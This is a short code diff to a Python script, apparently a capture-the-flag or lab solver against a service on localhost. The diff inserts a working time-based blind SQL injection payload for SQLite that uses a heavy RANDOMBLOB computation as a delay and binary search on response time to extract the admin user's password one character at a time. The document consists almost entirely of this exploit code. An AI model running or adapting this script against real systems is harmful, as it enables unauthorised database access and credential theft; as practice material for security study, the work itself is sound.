@@ -1,4 +1,5 @@
 import requests
+import time
 
 url = "http://127.0.0.1:30032"
 
@@ -8,10 +9,13 @@ while True:
     e = 256
     while(s<=e):
         mid = (s+e)//2
-        payload = *** payload here ***
-        
+        print(res+chr(mid))
+        payload = f"' or CASE WHEN username='admin' and password>='{res+chr(mid)}' THEN 1 ELSE UPPER(HEX(RANDOMBLOB(1000000000/2))) END --"
+    
+        recent_time = time.time_ns()
         response = requests.get(url=url, params={"password":payload})
-        if "Error" in response.text:
+        print(time.time_ns() - recent_time)
+        if time.time_ns() - recent_time > 1000000000:
             e = mid-1
         else: 
             s = mid+1
